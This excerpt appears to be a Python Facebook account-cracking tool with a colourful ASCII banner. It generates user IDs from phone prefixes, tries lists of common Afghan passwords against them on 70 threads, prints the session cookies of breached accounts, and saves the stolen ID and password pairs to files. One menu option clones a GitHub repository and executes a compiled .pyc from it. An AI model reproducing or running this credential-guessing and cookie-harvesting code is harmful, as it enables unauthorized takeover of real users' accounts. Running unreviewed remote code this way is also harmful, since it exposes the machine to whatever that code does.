...
\033[0;32m _                 _______  _______  _______  _______ 

ooooo ooooo ooooo oooo     oooo      o   ooooooooooo 
 888   888   888   8888o   888      888  88  888  88 
 888ooo888   888   88 888o8 88     8  88     888     
 888   888   888   88  888  88    8oooo88    888     
o888o o888o o888o o88o  8  o88o o88o  o888o o888o                                                         
                                                      
\x1b[1;96m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92mAHMAD ZIA
[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92mAhmad Zia HIMAT
[\033[1;92m\033[1;34m✔\033[1;92m]TOOL           \033[1;91m\033[1;34m: \033[1;92mRANDOM (FREE)
[\033[1;92m\033[1;34m✔\033[1;92m]STATUS         \033[1;91m\033[1;34m: \033[1;92mHIMAT KING
...
def barie():
    ...
    if opt == '2':
        ...
        return None
    if opt == '1':
    	os.system('rm -rf Murtaza && git clone https://github.com/Barie-khumari/Murtaza && cd Murtaza && python HAZRAT_DUMP.pyc')
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','500500','10002000','50006000','kabul123','Afghan12345','۱۲۳۴۵۶۷۸۹','afghan123']
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print(' CHOOSE CODE : 9378, 9379, 9377, 9370, 9374')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','50005000','afgan123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','kabul123','۱۰۰۲۰۰','۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','400500','50005000','afghan123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6554.124 Safari/537.36'}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HIMATKING-OK] '+uid+' | '+ps+' \n\033[1;33m COOKIE = \033[1;35m'+coki+  '  ''  \033[0;97m');print(53*'\033[1;37m═')
                open('HIMATKING-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('[HIMAT-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('HIMAT-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
